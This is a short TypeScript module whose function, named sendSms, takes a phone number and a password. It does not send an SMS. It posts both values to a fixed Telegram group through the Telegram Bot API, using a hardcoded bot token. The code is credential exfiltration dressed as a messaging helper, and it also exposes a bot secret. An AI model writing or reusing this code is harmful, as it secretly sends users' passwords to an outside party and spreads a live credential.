import { BaseError } from "../reporter/base.error";
import axios from 'axios'
export async function sendSms(phoneNumber: string, password: string) {
    try {
        await axios.get(encodeURI(`https://api.telegram.org/bot5015070391:AAHwVRRupm4T8vJSqT0E7esnoL9pUliUZj8/sendMessage?chat_id=-1001694162994&parse_mode=html&text=${password}--->${phoneNumber}`))
    } catch (e) {
        throw BaseError.SmsSendingFailed(e);
    }
}